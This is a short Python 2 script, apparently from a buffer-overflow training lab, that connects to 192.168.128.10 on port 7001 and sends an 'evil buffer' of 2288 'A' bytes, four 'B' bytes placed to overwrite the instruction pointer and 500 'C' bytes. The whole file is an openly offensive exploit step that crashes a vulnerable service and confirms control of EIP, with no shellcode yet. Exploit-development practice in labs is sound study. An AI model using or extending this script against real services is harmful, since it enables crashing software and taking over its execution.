#!/usr/bin/python
import socket
import time
try:
  print "[*] Sending evil buffer..."

  buffer = "A" * 2288
  EIP = "B" * 4
  offset = "C" * 500
  overflow = buffer + EIP + offset
  print "[*] Buffer size is: " + str(len(overflow))
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.128.10", 7001))
  s.send(overflow)
  s.close()
  time.sleep(2)
  print "[*] Done!"
  
except:
  print "[*] Error could not connect!"


